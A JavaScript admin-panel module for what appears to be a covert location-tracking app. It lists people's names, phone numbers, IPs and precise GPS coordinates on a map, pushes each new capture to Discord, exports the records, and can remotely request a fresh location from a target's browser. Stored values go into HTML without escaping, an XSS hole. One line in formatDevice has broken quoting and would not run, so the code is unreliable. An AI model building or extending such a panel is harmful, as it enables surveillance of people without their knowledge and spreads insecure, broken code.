import * as DataManager from "./data-manager.js";
import * as MapHandler from "./map-handler.js";
import * as UIUtils from "./ui-utils.js";
import { sendLocationNotification } from "./discord.js";
import { logger } from "../../utils/logger.js";

let autoRefreshInterval, timerInterval, realtimeListener = null;
const REFRESH_INTERVAL = 30;

let allLocations = [];
let filteredLocations = [];
let currentPage = 1;
const PAGE_SIZE = 25;
let sortColumn = "timestamp";
let sortDirection = "desc";
let searchQuery = "";

export async function initializeAdmin() {
    console.log("[Admin] Starting admin panel initialization...");
    console.log("[Admin] Database available:", !!window.database);
    try {
        setupEventListeners();
        initializeMap();
        await refreshData();
        setupRealtimeListener();
        console.log("[Admin] Admin panel initialized successfully");
    } catch (error) {
        console.error("[Admin] Admin initialization error:", error);
        UIUtils.showError("Initialization error: " + error.message);
    }
}

function initializeMap() {
    const mapLoading = document.getElementById("mapLoading");
    const tryInit = (attempt = 1) => {
        const map = MapHandler.initMap();
        if (map) {
            if (mapLoading) mapLoading.classList.add("hidden");
            updateMapMarkers();
        } else if (attempt < 10) {
            setTimeout(() => tryInit(attempt + 1), 300);
        } else if (mapLoading) {
            mapLoading.innerHTML = '<span style="color:#ef4444">Map failed to load</span>';
        }
    };
    setTimeout(() => tryInit(), 100);
}

function updateMapMarkers() {
    MapHandler.clearMarkers();
    const withCoords = allLocations.filter(l => l.latitude && l.longitude);
    withCoords.forEach(loc => MapHandler.addMarker(loc.latitude, loc.longitude, loc));
    const el = document.getElementById("markerCount");
    if (el) el.textContent = withCoords.length + " markers";
    if (withCoords.length > 0) MapHandler.fitToMarkers();
}

function updateMarkerCount() {
    const el = document.getElementById("markerCount");
    if (el) el.textContent = allLocations.filter(l => l.latitude && l.longitude).length + " markers";
}

function setupRealtimeListener() {
    if (!window.database) return;
    const locationsRef = window.database.ref("locations");
    realtimeListener = locationsRef.orderByChild("timestamp").limitToLast(200);
    
    realtimeListener.on("child_added", (snapshot) => {
        const loc = { key: snapshot.key, ...snapshot.val() };
        if (allLocations.findIndex(l => l.key === loc.key) === -1) {
            allLocations.unshift(loc);
            applyFiltersAndRender();
            if (loc.latitude && loc.longitude) {
                MapHandler.addMarker(loc.latitude, loc.longitude, loc);
                updateMarkerCount();
            }
            sendLocationNotification(loc);
            setTimeout(() => {
                const row = document.querySelector(`tr[data-key="${loc.key}"]`);
                if (row) row.classList.add("new-location");
            }, 50);
        }
    });
    
    realtimeListener.on("child_changed", (snapshot) => {
        const loc = { key: snapshot.key, ...snapshot.val() };
        const idx = allLocations.findIndex(l => l.key === loc.key);
        if (idx !== -1) {
            const old = allLocations[idx];
            allLocations[idx] = loc;
            applyFiltersAndRender();
            if (old.latitude !== loc.latitude || old.longitude !== loc.longitude) {
                MapHandler.removeMarker(old.latitude, old.longitude);
                if (loc.latitude && loc.longitude) MapHandler.addMarker(loc.latitude, loc.longitude, loc);
                updateMarkerCount();
            }
        }
    });
    
    realtimeListener.on("child_removed", (snapshot) => {
        const loc = allLocations.find(l => l.key === snapshot.key);
        if (loc) MapHandler.removeMarker(loc.latitude, loc.longitude);
        allLocations = allLocations.filter(l => l.key !== snapshot.key);
        applyFiltersAndRender();
        updateMarkerCount();
    });
}

function setupEventListeners() {
    const refreshBtn = document.getElementById("refreshDataBtn");
    if (refreshBtn) {
        refreshBtn.addEventListener("click", () => {
            refreshBtn.disabled = true;
            refreshBtn.innerHTML = "Loading...";
            refreshData().finally(() => {
                refreshBtn.disabled = false;
                refreshBtn.innerHTML = "Refresh";
            });
        });
    }
    
    const autoRefreshCb = document.getElementById("autoRefresh");
    const timerEl = document.getElementById("refreshTimer");
    if (autoRefreshCb) {
        autoRefreshCb.addEventListener("change", (e) => {
            if (e.target.checked) {
                let timeLeft = REFRESH_INTERVAL;
                timerEl.textContent = timeLeft + "s";
                timerInterval = setInterval(() => {
                    timeLeft--;
                    timerEl.textContent = timeLeft + "s";
                    if (timeLeft <= 0) timeLeft = REFRESH_INTERVAL;
                }, 1000);
                autoRefreshInterval = setInterval(() => refreshData(), REFRESH_INTERVAL * 1000);
            } else {
                clearInterval(autoRefreshInterval);
                clearInterval(timerInterval);
                timerEl.textContent = "";
            }
        });
    }
    
    const searchInput = document.getElementById("searchInput");
    if (searchInput) {
        let timeout;
        searchInput.addEventListener("input", (e) => {
            clearTimeout(timeout);
            timeout = setTimeout(() => {
                searchQuery = e.target.value.toLowerCase().trim();
                currentPage = 1;
                applyFiltersAndRender();
            }, 200);
        });
    }
    
    document.querySelectorAll(".data-table th.sortable").forEach(th => {
        th.addEventListener("click", () => {
            const col = th.dataset.sort;
            if (sortColumn === col) sortDirection = sortDirection === "asc" ? "desc" : "asc";
            else { sortColumn = col; sortDirection = "desc"; }
            applyFiltersAndRender();
            updateSortIndicators();
        });
    });
    
    const csvBtn = document.getElementById("exportCsvBtn");
    if (csvBtn) csvBtn.addEventListener("click", () => exportData("csv"));
    const jsonBtn = document.getElementById("exportJsonBtn");
    if (jsonBtn) jsonBtn.addEventListener("click", () => exportData("json"));
    const discordBtn = document.getElementById("testDiscordBtn");
    if (discordBtn) discordBtn.addEventListener("click", testDiscord);
}

function updateSortIndicators() {
    document.querySelectorAll(".data-table th.sortable").forEach(th => {
        th.classList.remove("sorted-asc", "sorted-desc");
        if (th.dataset.sort === sortColumn) {
            th.classList.add(sortDirection === "asc" ? "sorted-asc" : "sorted-desc");
        }
    });
}

export async function refreshData() {
    const tbody = document.getElementById("logsTable");
    try {
        console.log("[Admin] Refreshing data, database available:", !!window.database);
        if (!window.database) {
            throw new Error("Database not initialized");
        }
        const locations = await DataManager.fetchLocations();
        console.log("[Admin] Fetched", locations.length, "locations");
        allLocations = locations.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        applyFiltersAndRender();
        updateMapMarkers();
    } catch (error) {
        console.error("[Admin] Error refreshing data:", error);
        UIUtils.showToast("Failed to load data: " + error.message, "error");
        if (tbody) tbody.innerHTML = `<tr class="empty-row"><td colspan="8">Error loading data: ${error.message}</td></tr>`;
    }
}

function applyFiltersAndRender() {
    if (searchQuery) {
        filteredLocations = allLocations.filter(loc => {
            const fields = [loc.firstName, loc.lastName, loc.phone, loc.ip, loc.latitude?.toString(), loc.longitude?.toString(), loc.locationSource, loc.browser?.name].filter(Boolean).join(" ").toLowerCase();
            return fields.includes(searchQuery);
        });
    } else {
        filteredLocations = [...allLocations];
    }
    
    filteredLocations.sort((a, b) => {
        let aVal = a[sortColumn], bVal = b[sortColumn];
        if (sortColumn === "firstName") {
            aVal = ((a.firstName || "") + " " + (a.lastName || "")).trim().toLowerCase();
            bVal = ((b.firstName || "") + " " + (b.lastName || "")).trim().toLowerCase();
        }
        if (typeof aVal === "number" && typeof bVal === "number") {
            return sortDirection === "asc" ? aVal - bVal : bVal - aVal;
        }
        aVal = String(aVal || "").toLowerCase();
        bVal = String(bVal || "").toLowerCase();
        return sortDirection === "asc" ? aVal.localeCompare(bVal) : bVal.localeCompare(aVal);
    });
    
    renderTable();
    renderPagination();
}

function renderTable() {
    const tbody = document.getElementById("logsTable");
    if (!tbody) return;
    
    const start = (currentPage - 1) * PAGE_SIZE;
    const pageData = filteredLocations.slice(start, start + PAGE_SIZE);
    
    if (pageData.length === 0) {
        tbody.innerHTML = `<tr class="empty-row"><td colspan="8">${searchQuery ? "No results" : "No data yet"}</td></tr>`;
        return;
    }
    
    tbody.innerHTML = pageData.map(loc => createRow(loc)).join("");
    
    tbody.querySelectorAll("tr[data-key]").forEach(row => {
        const key = row.dataset.key;
        const loc = allLocations.find(l => l.key === key);
        if (!loc) return;
        
        row.addEventListener("click", (e) => {
            if (e.target.closest("button")) return;
            document.querySelectorAll(".data-table tbody tr").forEach(r => r.classList.remove("selected"));
            row.classList.add("selected");
            if (loc.latitude && loc.longitude) MapHandler.focusLocation(loc.latitude, loc.longitude, true);
        });
        
        const reqBtn = row.querySelector(".action-btn.request");
        if (reqBtn) reqBtn.addEventListener("click", (e) => { e.stopPropagation(); requestLocation(key, loc, reqBtn); });
        
        const delBtn = row.querySelector(".action-btn.delete");
        if (delBtn) delBtn.addEventListener("click", (e) => { e.stopPropagation(); deleteLocation(key, delBtn); });
    });
}

function createRow(loc) {
    const name = formatName(loc);
    const time = loc.timestamp ? new Date(loc.timestamp).toLocaleString() : "Unknown";
    const coords = loc.latitude && loc.longitude ? `${loc.latitude.toFixed(4)}, ${loc.longitude.toFixed(4)}` : "Unknown";
    const accuracy = formatAccuracy(loc.accuracy);
    const source = formatSource(loc.locationSource);
    const device = formatDevice(loc);
    
    return `<tr data-key="${loc.key}">
        <td><span class="cell-user truncate" title="${name}">${name}</span></td>
        <td><span class="cell-time">${time}</span></td>
        <td><span class="cell-ip">${loc.ip || "Unknown"}</span></td>
        <td><span class="cell-coords truncate" title="${coords}">${coords}</span></td>
        <td>${accuracy}</td>
        <td>${source}</td>
        <td><div class="device-info">${device}</div></td>
        <td><button class="action-btn request">Request</button><button class="action-btn delete">Delete</button></td>
    </tr>`;
}

function formatName(loc) {
    const parts = [loc.firstName, loc.lastName].filter(Boolean);
    if (parts.length === 0) return loc.phone || "Anonymous";
    return parts.join(" ");
}

function formatAccuracy(acc) {
    if (!acc) return '<span class="accuracy-badge"><span class="accuracy-dot"></span>Unknown</span>';
    let cls = "poor";
    if (acc < 50) cls = "excellent";
    else if (acc < 200) cls = "good";
    else if (acc < 1000) cls = "fair";
    return `<span class="accuracy-badge"><span class="accuracy-dot ${cls}"></span>±${Math.round(acc)}m</span>`;
}

function formatSource(src) {
    if (!src) return '<span class="source-badge ip">Unknown</span>';
    const s = src.toLowerCase();
    let cls = "ip";
    if (s.includes("gps")) cls = "gps";
    else if (s.includes("wifi")) cls = "wifi";
    else if (s.includes("cell")) cls = "cell";
    return `<span class="source-badge ${cls}">${src}</span>`;
}

function formatDevice(loc) {
    const browser = loc.browser?.name || "Unknown";
    const version = loc.browser?.version || "";

    const platform = loc.device?.platform || loc.platform || "";
    const ver = version ? " " + version : "";
    const plat = platform ? "<br>" + platform : "";
    return "<span class="browser">" + browser + ver + "</span>" + plat;
}

function renderPagination() {
    const totalPages = Math.ceil(filteredLocations.length / PAGE_SIZE);
    const info = document.getElementById("paginationInfo");
    const controls = document.getElementById("paginationControls");
    if (!info || !controls) return;
    
    const start = filteredLocations.length === 0 ? 0 : (currentPage - 1) * PAGE_SIZE + 1;
    const end = Math.min(currentPage * PAGE_SIZE, filteredLocations.length);
    info.textContent = `Showing ${start}-${end} of ${filteredLocations.length}`;
    
    if (totalPages <= 1) { controls.innerHTML = ""; return; }
    
    let html = `<button ${currentPage === 1 ? "disabled" : ""} data-page="${currentPage - 1}">Prev</button>`;
    const maxPages = 5;
    let startPage = Math.max(1, currentPage - Math.floor(maxPages / 2));
    let endPage = Math.min(totalPages, startPage + maxPages - 1);
    if (endPage - startPage < maxPages - 1) startPage = Math.max(1, endPage - maxPages + 1);
    
    if (startPage > 1) { html += '<button data-page="1">1</button>'; if (startPage > 2) html += '<button disabled>...</button>'; }
    for (let i = startPage; i <= endPage; i++) html += `<button ${i === currentPage ? 'class="active"' : ""} data-page="${i}">${i}</button>`;
    if (endPage < totalPages) { if (endPage < totalPages - 1) html += '<button disabled>...</button>'; html += `<button data-page="${totalPages}">${totalPages}</button>`; }
    html += `<button ${currentPage === totalPages ? "disabled" : ""} data-page="${currentPage + 1}">Next</button>`;
    
    controls.innerHTML = html;
    controls.querySelectorAll("button[data-page]").forEach(btn => {
        btn.addEventListener("click", () => {
            const page = parseInt(btn.dataset.page);
            if (page >= 1 && page <= totalPages) {
                currentPage = page;
                renderTable();
                renderPagination();
                document.querySelector(".table-container")?.scrollTo(0, 0);
            }
        });
    });
}

function exportData(format) {
    const data = filteredLocations.map(loc => ({
        user: formatName(loc), phone: loc.phone || "", timestamp: loc.timestamp ? new Date(loc.timestamp).toISOString() : "",
        ip: loc.ip || "", latitude: loc.latitude || "", longitude: loc.longitude || "",
        accuracy: loc.accuracy || "", source: loc.locationSource || "", browser: loc.browser?.name || "", platform: loc.device?.platform || ""
    }));
    
    let content, filename, type;
    if (format === "csv") {
        const headers = Object.keys(data[0] || {});
        const rows = data.map(row => headers.map(h => `"${(row[h] || "").toString().replace(/"/g, '""')}"`).join(","));
        content = [headers.join(","), ...rows].join("\n");
        filename = `locations_${new Date().toISOString().split("T")[0]}.csv`;
        type = "text/csv";
    } else {
        content = JSON.stringify(data, null, 2);
        filename = `locations_${new Date().toISOString().split("T")[0]}.json`;
        type = "application/json";
    }
    
    const blob = new Blob([content], { type });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a"); a.href = url; a.download = filename; a.click();
    URL.revokeObjectURL(url);
    UIUtils.showToast(`Exported ${data.length} locations as ${format.toUpperCase()}`, "success");
}

async function testDiscord() {
    const btn = document.getElementById("testDiscordBtn");
    if (btn) { btn.disabled = true; btn.innerHTML = "Sending..."; }
    try {
        await sendLocationNotification({
            firstName: "Test", lastName: "User", phone: "021-123-4567", ip: "192.168.1.1",
            latitude: -41.2866, longitude: 174.7756, accuracy: 15, locationSource: "GPS", timestamp: Date.now()
        }, true);
        UIUtils.showToast("Test notification sent!", "success");
    } catch (e) { UIUtils.showToast("Discord failed: " + e.message, "error"); }
    finally { if (btn) { btn.disabled = false; btn.innerHTML = "Discord"; } }
}

async function deleteLocation(key, btn) {
    if (!key) return;
    const loc = allLocations.find(l => l.key === key);
    if (!loc) { UIUtils.showToast("Location not found", "error"); return; }
    
    const name = formatName(loc);
    if (!confirm(`Delete location for "${name}"?\n\nThis cannot be undone.`)) return;
    
    const origText = btn.textContent;
    btn.disabled = true; btn.textContent = "...";
    
    try {
        await DataManager.deleteLocation(key);
        if (loc.latitude && loc.longitude) MapHandler.removeMarker(loc.latitude, loc.longitude);
        allLocations = allLocations.filter(l => l.key !== key);
        applyFiltersAndRender();
        updateMarkerCount();
        UIUtils.showToast("Location deleted", "success");
    } catch (e) {
        UIUtils.showToast("Delete failed: " + e.message, "error");
        btn.disabled = false; btn.textContent = origText;
    }
}

async function requestLocation(key, currentData, btn) {
    if (!key || !btn) return;
    
    const origText = btn.textContent;
    btn.disabled = true; btn.textContent = "Waiting...";
    UIUtils.showToast("Location request sent...", "info", false);
    
    try {
        const requestRef = await DataManager.requestLocationUpdate(key);
        let completed = false;
        
        const handleResponse = (snapshot) => {
            const req = snapshot.val();
            if (!req || completed) return;
            
            if (req.status === "completed" && req.newLocation) {
                completed = true;
                if (currentData.latitude && currentData.longitude) {
                    MapHandler.removeMarker(currentData.latitude, currentData.longitude);
                }
                MapHandler.addMarker(req.newLocation.latitude, req.newLocation.longitude, { ...currentData, ...req.newLocation });
                MapHandler.focusLocation(req.newLocation.latitude, req.newLocation.longitude, true);
                UIUtils.showToast("Location updated!", "success");
                requestRef.off("value", handleResponse);
                refreshData();
                btn.disabled = false; btn.textContent = origText;
            } else if (req.status === "failed") {
                completed = true;
                UIUtils.showToast("Request failed: " + (req.error || "Client unavailable"), "error");
                requestRef.off("value", handleResponse);
                btn.disabled = false; btn.textContent = origText;
            }
        };
        
        requestRef.on("value", handleResponse);
        
        setTimeout(() => {
            if (!completed) {
                completed = true;
                requestRef.off("value", handleResponse);
                UIUtils.showToast("Request timed out. Client may be offline.", "warning");
                btn.disabled = false; btn.textContent = origText;
                requestRef.update({ status: "timeout" }).catch(() => {});
            }
        }, 30000);
    } catch (e) {
        UIUtils.showToast("Request failed: " + e.message, "error");
        btn.disabled = false; btn.textContent = origText;
    }
}

